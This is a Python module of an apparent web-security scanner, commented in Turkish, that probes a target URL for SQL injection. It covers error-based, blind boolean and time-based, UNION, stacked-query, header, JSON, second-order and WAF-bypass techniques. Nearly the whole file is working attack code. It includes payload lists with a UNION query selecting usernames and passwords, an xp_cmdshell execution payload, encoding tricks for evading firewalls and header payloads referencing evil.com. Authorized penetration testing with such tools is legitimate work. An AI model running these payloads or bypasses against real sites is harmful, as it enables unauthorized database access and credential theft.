#!/usr/bin/env python3
"""
Maxima Cog: Deep SQL Injection Scanner — v2 (Kurumsal Seviye)

Teknikler:
  - Error-based (8 DB motoru, 90+ imza)
  - Boolean blind (adaptif eşik, 8 çift, keyword diff, gürültü filtresi)
  - Time-based blind (DB bazlı, dinamik eşik, çift doğrulama)
  - UNION kolon tespiti (NULL + string + int, 8 kolona kadar)
  - Stacked queries
  - WAF bypass (encode, comment, case, whitespace, double-encode)
  - HTTP header enjeksiyonu (7 başlık)
  - JSON body enjeksiyonu
  - İkinci derece SQLi (form kayıt)
  - SecLists-uyumlu büyük payload seti
  - Parametre keşfi: URL, form input/textarea/select, JSON, hidden field
"""

import re
import time
import json
import urllib.parse
from typing import Dict, List, Optional, Tuple
from utils.base_module import BaseModule, ModuleResult

# ── DB hata imzaları ─────────────────────────────────────────
DB_ERRORS: Dict[str, List[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "mysql_fetch_array", "mysql_num_rows",
        "supplied argument is not a valid mysql",
        "call to a member function", "column count doesn't match",
        "com.mysql.jdbc", "org.gjt.mm.mysql",
        "mysql server version for the right syntax",
        "valid mysql result", "mysqlclient.",
        "mysql_connect()", "mysql_query()",
        "mysql error with query",
    ],
    "PostgreSQL": [
        "pg_query()", "pg_exec()", "postgresql query failed",
        "unterminated quoted string at or near",
        "syntax error at or near", "org.postgresql",
        "npgsql.", "pgsql error", "pg_connect()",
        "pg::syntaxerror",
    ],
    "MSSQL": [
        "unclosed quotation mark after the character string",
        "incorrect syntax near", "microsoft odbc sql server driver",
        "microsoft jet database engine", "syntax error converting",
        "microsoft sql server", "com.microsoft.sqlserver",
        "mssql_query()", "sqlsrv_query()", "[sqlserver]",
        "odbc sql server driver", "sqlstate[42000]",
        "sql server does not exist", "sql server error",
    ],
    "Oracle": [
        "ora-01756", "ora-00933", "ora-00907", "ora-00942",
        "ora-00904", "ora-01722", "ora-00001",
        "quoted string not properly terminated",
        "oracle error", "oracle.jdbc", "jdbc:oracle",
    ],
    "SQLite": [
        "sqlite_", "sqlite error", "sqlite3::",
        "near \"syntax\"", "sqlite.exception",
        "system.data.sqlite", "sqlite3.operationalerror",
    ],
    "DB2": [
        "ibm_db2", "db2 sql error", "db2 native",
        "db2 odbc", "sqlcode=-", "com.ibm.db2",
    ],
    "Sybase": [
        "sybase message", "sybase sql server",
        "adaptive server", "sybase.jdbc",
    ],
    "Informix": [
        "ifx_", "informix", "com.informix.jdbc",
    ],
}

# ── Error-based payloads (SecLists genişletilmiş) ────────────
ERROR_PAYLOADS: List[str] = [
    "'", "''", '"', "`", "\\",
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1#",
    '\" OR \"1\"=\"1', "') OR ('1'='1", "') OR 1=1--",
    "1' OR '1'='1", '1" OR "1"="1',
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--", "1' ORDER BY 100--",
    "' AND 1=1--", "' AND 1=2--", "' AND 1=1#", "' AND 1=2#",
    "' HAVING 1=1--", "' GROUP BY 1--",
    "'; SELECT 1--", "'; SELECT SLEEP(0)--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT NULL--",
    "1 UNION SELECT @@version--",
    "'--", "'#", "'/*", "' -- -",
    "' OR/**/'1'='1", "' /*!OR*/ '1'='1",
    "'%20OR%20'1'='1", "' oR '1'='1",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' OR 1=1 LIMIT 1--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT NULL FROM dual--",
    "((( ' )))",
    "9999'", "0'", "-1'",
    "' AND SLEEP(0)--",
    "'; SELECT pg_sleep(0)--",
    "'; EXEC xp_cmdshell('echo maxima')--",
    "' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--",
]

# ── Boolean blind çiftleri ────────────────────────────────────
BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    ("' AND 1=1--",                        "' AND 1=2--"),
    ("' AND 'a'='a'--",                    "' AND 'a'='b'--"),
    ("1 AND 1=1",                          "1 AND 1=2"),
    ("' OR 1=1--",                         "' OR 1=2--"),
    ('\" AND 1=1--',                       '\" AND 1=2--'),
    ("' AND 2>1--",                        "' AND 2<1--"),
    ("' AND SUBSTR('abc',1,1)='a'--",      "' AND SUBSTR('abc',1,1)='z'--"),
    ("1 AND 1=1 AND 1=1",                  "1 AND 1=1 AND 1=2"),
]

# ── Time-based payloads ───────────────────────────────────────
TIME_PAYLOADS: Dict[str, List[str]] = {
    "MySQL": [
        "'; SELECT SLEEP(5)--", "' OR SLEEP(5)--",
        "' AND SLEEP(5) AND '1'='1",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    ],
    "PostgreSQL": [
        "'; SELECT pg_sleep(5)--", "' OR pg_sleep(5)--",
        "' OR (SELECT 1 FROM pg_sleep(5))--",
        "1;SELECT pg_sleep(5)--",
    ],
    "MSSQL": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
    ],
    "Oracle": [
        "'; DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
        "' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)--",
    ],
    "SQLite": [
        "'; SELECT RANDOMBLOB(500000000)--",
        "' OR (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(500000000) ELSE 1 END)--",
    ],
    "Generic": [
        "' AND SLEEP(5)--", "'; SLEEP(5)--",
    ],
}

# ── WAF bypass fonksiyonları ──────────────────────────────────
WAF_BYPASS_FNS = [
    lambda p: urllib.parse.quote(p),
    lambda p: urllib.parse.quote(p, safe=""),
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" OR ", " /*!OR*/ ").replace(" AND ", " /*!AND*/ "),
    lambda p: p.replace(" ", "\t"),
    lambda p: p.replace(" ", "\n"),
    lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
    lambda p: p.replace("SELECT", "SEL/**/ECT").replace("UNION", "UN/**/ION"),
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    lambda p: p.replace(" ", "%09"),
]

# ── UNION kolon probes ────────────────────────────────────────
UNION_PROBES: List[Tuple[str, int]] = [
    ("' UNION SELECT NULL--",                 1),
    ("' UNION SELECT NULL,NULL--",            2),
    ("' UNION SELECT NULL,NULL,NULL--",       3),
    ("' UNION SELECT NULL,NULL,NULL,NULL--",  4),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", 5),
    ("' UNION ALL SELECT NULL--",             1),
    ("' UNION ALL SELECT NULL,NULL--",        2),
    ("' UNION ALL SELECT NULL,NULL,NULL--",   3),
    ("' UNION SELECT 1--",                    1),
    ("' UNION SELECT 1,2--",                  2),
    ("' UNION SELECT 1,2,3--",                3),
    ("' UNION SELECT 'a'--",                  1),
    ("' UNION SELECT 'a','b'--",              2),
    ("' UNION SELECT 'a','b','c'--",          3),
]

# ── Header injection ──────────────────────────────────────────
INJECTABLE_HEADERS = [
    ("X-Forwarded-For",  "127.0.0.1' OR '1'='1"),
    ("User-Agent",       "Mozilla' OR '1'='1"),
    ("Referer",          "https://evil.com/' OR '1'='1"),
    ("Cookie",           "session=abc' OR '1'='1"),
    ("X-Real-IP",        "127.0.0.1' OR '1'='1"),
    ("Accept-Language",  "en-US' OR '1'='1"),
    ("X-Forwarded-Host", "evil.com' OR '1'='1"),
]

# ── JSON payloads ─────────────────────────────────────────────
JSON_PAYLOADS = [
    '{"id": "1\'"}',
    '{"id": "1\' OR \'1\'=\'1"}',
    '{"username": "admin\'--", "password": "x"}',
    '{"search": "\' UNION SELECT NULL--"}',
    '{"q": "\' AND 1=1--"}',
]

# ── Stacked queries ───────────────────────────────────────────
STACKED_PAYLOADS = [
    "'; SELECT 1--",
    "'; SELECT 1,2,3--",
    "'; SELECT pg_sleep(0)--",
    "'; WAITFOR DELAY '0:0:0'--",
    "1; SELECT 1--",
]

# ── 2nd order ────────────────────────────────────────────────
SECOND_ORDER_PAYLOADS = [
    "admin'--",
    "' OR '1'='1",
    "1' ORDER BY 1--",
    "test' UNION SELECT NULL--",
]


def _has_db_error(body_lower: str, exclude_base: str = "") -> Tuple[bool, str, str]:
    for db, errors in DB_ERRORS.items():
        for err in errors:
            if err in body_lower:
                if exclude_base and err in exclude_base.lower():
                    continue
                return True, err, db
    return False, "", ""


class DeepSQLiScanner(BaseModule):
    """Deep SQL Injection — kurumsal seviye, 9 teknik"""

    def run(self) -> ModuleResult:
        self.log("SQLi taraması v2 başlatılıyor (9 teknik)...", "info")

        findings_before = len(self.results["findings"])
        params = self._find_parameters()
        if not params:
            params = [
                ("id","1"),("q","test"),("search","a"),
                ("user","admin"),("cat","1"),("page","1"),
                ("item","1"),("name","test"),("key","1"),
            ]
        self.log(f"{len(params)} parametre bulundu", "info")

        vulnerable = set()
        for param, default in params[:10]:
            if param in vulnerable:
                continue
            self.log(f"  → {param}={default}", "info")
            if self._test_error_based(param, default):
                vulnerable.add(param); continue
            if self._test_boolean_blind(param, default):
                vulnerable.add(param); continue
            if self._test_time_based(param, default):
                vulnerable.add(param); continue
            if self._test_stacked_queries(param, default):
                vulnerable.add(param); continue
            if self._test_waf_bypass(param, default):
                vulnerable.add(param)

        self._test_union_columns()
        self._test_header_injection()
        self._test_json_injection()
        self._test_second_order()

        total = len(self.results["findings"]) - findings_before
        self.results["summary"].update({
            "Taranan Parametre":    len(params),
            "Savunmasız Parametre": len(vulnerable),
            "Toplam Bulgu":         total,
            "Teknikler":            "Error/Boolean/Time/Stacked/UNION/WAF/Header/JSON/2ndOrder",
        })
        return self.results

    # ── Parametre keşfi ──────────────────────────────────────
    def _find_parameters(self) -> List[Tuple[str, str]]:
        params: List[Tuple[str, str]] = []
        seen = set()

        def add(k, v="1"):
            k = k.strip()
            skip = {"submit","csrf","_token","nonce","__viewstate","action","method"}
            if k and k.lower() not in skip and k not in seen:
                seen.add(k)
                params.append((k, v or "1"))

        parsed = urllib.parse.urlparse(self.url)
        for k, v in urllib.parse.parse_qsl(parsed.query):
            add(k, v)

        try:
            resp = self.http_get(self.url)
            body = resp.get("body", "")
            for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?', body, re.I):
                add(m.group(1), m.group(2) or "1")
            for m in re.finditer(r'<textarea[^>]+name=["\']([^"\']+)["\']', body, re.I):
                add(m.group(1), "test")
            for m in re.finditer(r'<select[^>]+name=["\']([^"\']+)["\']', body, re.I):
                add(m.group(1), "1")
            # inline JSON keys
            for block in re.findall(r'\{[^{}]{10,200}\}', body)[:3]:
                try:
                    data = json.loads(block)
                    for k, v in data.items():
                        if isinstance(v, (str, int, float)):
                            add(str(k), str(v))
                except Exception:
                    pass
        except Exception:
            pass
        return params

    def _test_url(self, param: str, payload: str, hdrs: Optional[Dict] = None) -> Dict:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        new_qs = urllib.parse.urlencode(qs)
        if parsed.query:
            new_url = parsed._replace(query=new_qs).geturl()
        else:
            new_url = self.url.rstrip("?") + "?" + new_qs
        return self.http_get(new_url, headers=hdrs)

    # ── 1. Error-based ───────────────────────────────────────
    def _test_error_based(self, param: str, default: str) -> bool:
        baseline_body = self._test_url(param, default).get("body", "").lower()
        for payload in ERROR_PAYLOADS:
            try:
                body = self._test_url(param, payload).get("body", "").lower()
                found, err, db = _has_db_error(body, baseline_body)
                if found:
                    self.add_finding(
                        f"SQL Injection — Error-Based ({db})",
                        f"Param:{param} | Payload:{payload[:60]} | İmza:\"{err}\"",
                        "critical"
                    )
                    return True
            except Exception:
                continue
        return False

    # ── 2. Boolean blind ─────────────────────────────────────
    def _test_boolean_blind(self, param: str, default: str) -> bool:
        baseline_len = len(self._test_url(param, default).get("body", ""))

        for true_pay, false_pay in BOOLEAN_PAIRS:
            try:
                resps_t = [self._test_url(param, default + true_pay) for _ in range(3)]
                resps_f = [self._test_url(param, default + false_pay) for _ in range(3)]

                lens_t = [len(r.get("body","")) for r in resps_t]
                lens_f = [len(r.get("body","")) for r in resps_f]
                avg_t = sum(lens_t) / max(len(lens_t), 1)
                avg_f = sum(lens_f) / max(len(lens_f), 1)

                if avg_t == 0 or avg_f == 0:
                    continue

                # HTTP durum farkı
                codes_t = [r.get("status",0) for r in resps_t]
                codes_f = [r.get("status",0) for r in resps_f]
                mode_t = max(set(codes_t), key=codes_t.count)
                mode_f = max(set(codes_f), key=codes_f.count)
                if mode_t != mode_f and 0 not in (mode_t, mode_f):
                    self.add_finding(
                        "SQL Injection — Boolean Blind (HTTP durum farkı)",
                        f"Param:{param} | TRUE:{mode_t} FALSE:{mode_f} | {true_pay[:50]}",
                        "critical"
                    )
                    return True

                # Boyut farkı (adaptif %12, gürültü filtreli)
                diff_ratio = abs(avg_t - avg_f) / max(avg_t, avg_f)
                if diff_ratio > 0.12 and avg_t > 150 and avg_f > 150 and baseline_len > 0:
                    noise_t = abs(avg_t - baseline_len) / max(avg_t, baseline_len)
                    noise_f = abs(avg_f - baseline_len) / max(avg_f, baseline_len)
                    if noise_t < 0.05 and noise_f > 0.10:
                        self.add_finding(
                            "SQL Injection — Boolean Blind (içerik farkı)",
                            f"Param:{param} | TRUE~baseline={noise_t*100:.1f}% FALSE-diff={noise_f*100:.1f}% | {true_pay[:50]}",
                            "critical"
                        )
                        return True

                # Keyword presence diff
                body_t = resps_t[0].get("body","").lower()
                body_f = resps_f[0].get("body","").lower()
                pos_kws = ["welcome","results","found","success","logged"]
                neg_kws = ["error","invalid","not found","no results","failed"]
                t_pos = sum(1 for kw in pos_kws if kw in body_t)
                f_pos = sum(1 for kw in pos_kws if kw in body_f)
                t_neg = sum(1 for kw in neg_kws if kw in body_t)
                f_neg = sum(1 for kw in neg_kws if kw in body_f)
                if t_pos > f_pos + 1 or f_neg > t_neg + 1:
                    self.add_finding(
                        "SQL Injection — Boolean Blind (keyword farkı)",
                        f"Param:{param} | TRUE pos:{t_pos} FALSE pos:{f_pos} | {true_pay[:50]}",
                        "high"
                    )
                    return True

            except Exception:
                continue
        return False

    # ── 3. Time-based ────────────────────────────────────────
    def _test_time_based(self, param: str, default: str) -> bool:
        baselines = []
        for _ in range(3):
            t0 = time.time()
            try: self._test_url(param, default)
            except Exception: pass
            baselines.append(time.time() - t0)
        baseline_avg = sum(baselines) / max(len(baselines), 1)
        threshold = max(4.5, baseline_avg * 2.5 + 2.5)

        for db, payloads in TIME_PAYLOADS.items():
            for payload in payloads[:3]:
                try:
                    t0 = time.time()
                    self._test_url(param, default + payload)
                    elapsed = time.time() - t0
                    if elapsed >= threshold:
                        # Çift doğrulama
                        t0b = time.time()
                        self._test_url(param, default + payload)
                        elapsed2 = time.time() - t0b
                        if elapsed2 >= threshold * 0.7:
                            self.add_finding(
                                f"SQL Injection — Time-Based Blind ({db})",
                                f"Param:{param} | Gecikme1:{elapsed:.1f}s Gecikme2:{elapsed2:.1f}s | Baseline:{baseline_avg:.1f}s",
                                "critical"
                            )
                            return True
                except Exception:
                    continue
        return False

    # ── 4. Stacked queries ───────────────────────────────────
    def _test_stacked_queries(self, param: str, default: str) -> bool:
        baseline = self._test_url(param, default)
        base_body = baseline.get("body","").lower()
        base_status = baseline.get("status", 200)

        for payload in STACKED_PAYLOADS:
            try:
                resp = self._test_url(param, default + payload)
                body = resp.get("body","").lower()
                status = resp.get("status", 0)
                found, err, db = _has_db_error(body, base_body)
                if found:
                    self.add_finding(
                        f"Stacked Query SQLi ({db})",
                        f"Param:{param} | Payload:{payload[:60]} | İmza:\"{err}\"",
                        "critical"
                    )
                    return True
                if status == 500 and base_status != 500:
                    self.add_finding(
                        "Stacked Query SQLi — 500 Hatası (Doğrulama Gerekli)",
                        f"Param:{param} | Payload:{payload[:60]}",
                        "high"
                    )
                    return True
            except Exception:
                continue
        return False

    # ── 5. WAF bypass ────────────────────────────────────────
    def _test_waf_bypass(self, param: str, default: str) -> bool:
        base_body = self._test_url(param, default).get("body","").lower()
        for original in ERROR_PAYLOADS[:15]:
            for bypass_fn in WAF_BYPASS_FNS[:8]:
                try:
                    bypassed = bypass_fn(default + original)
                    body = self._test_url(param, bypassed).get("body","").lower()
                    found, err, db = _has_db_error(body, base_body)
                    if found:
                        self.add_finding(
                            f"SQL Injection — WAF Bypass ({db})",
                            f"Param:{param} | Bypass:{bypassed[:80]} | İmza:\"{err}\"",
                            "critical"
                        )
                        return True
                except Exception:
                    continue
        return False

    # ── 6. UNION kolon tespiti ───────────────────────────────
    def _test_union_columns(self):
        base_body = self._test_url("id", "1").get("body","")
        base_len = len(base_body)
        for payload, col_count in UNION_PROBES[:14]:
            try:
                resp = self._test_url("id", payload)
                body = resp.get("body","")
                body_lower = body.lower()
                found, _, _ = _has_db_error(body_lower)
                if found: continue
                null_count = body.upper().count("NULL")
                if resp.get("status",0) == 200 and null_count > col_count:
                    self.add_finding(
                        f"UNION SQLi — {col_count} Kolon",
                        f"Payload:{payload[:60]} | NULL yansıması:{null_count}x",
                        "high"
                    )
                    break
            except Exception:
                continue

    # ── 7. Header injection ──────────────────────────────────
    def _test_header_injection(self):
        base_body = self.http_get(self.url).get("body","").lower()
        for hname, payload in INJECTABLE_HEADERS:
            try:
                body = self.http_get(self.url, headers={hname: payload}).get("body","").lower()
                found, err, db = _has_db_error(body, base_body)
                if found:
                    self.add_finding(
                        f"SQL Injection — HTTP Header ({hname}, {db})",
                        f"Header:{hname} | Payload:{payload[:60]} | İmza:\"{err}\"",
                        "critical"
                    )
            except Exception:
                continue

    # ── 8. JSON body injection ───────────────────────────────
    def _test_json_injection(self):
        base_body = self.http_get(self.url).get("body","").lower()
        for jp in JSON_PAYLOADS:
            try:
                resp = self.http_post(
                    self.url, data=jp.encode(),
                    headers={"Content-Type": "application/json"}
                )
                body = resp.get("body","").lower()
                found, err, db = _has_db_error(body, base_body)
                if found:
                    self.add_finding(
                        f"SQL Injection — JSON Body ({db})",
                        f"Payload:{jp[:80]} | İmza:\"{err}\"",
                        "critical"
                    )
                    return
            except Exception:
                continue

    # ── 9. Second-order SQLi ─────────────────────────────────
    def _test_second_order(self):
        try:
            body = self.http_get(self.url).get("body","")
            m = re.search(
                r'<form[^>]+action=["\']([^"\']+)["\'][^>]*method=["\']post["\']',
                body, re.I
            )
            if not m:
                return
            action = m.group(1)
            if not action.startswith("http"):
                parsed = urllib.parse.urlparse(self.url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}"
            for payload in SECOND_ORDER_PAYLOADS[:3]:
                try:
                    post_data = urllib.parse.urlencode({"username": payload, "q": payload}).encode()
                    resp = self.http_post(action, data=post_data)
                    body_low = resp.get("body","").lower()
                    found, err, db = _has_db_error(body_low)
                    if found:
                        self.add_finding(
                            f"SQL Injection — İkinci Derece ({db})",
                            f"Form:{action} | Payload:{payload[:60]} | İmza:\"{err}\"",
                            "high"
                        )
                        return
                except Exception:
                    continue
        except Exception:
            pass
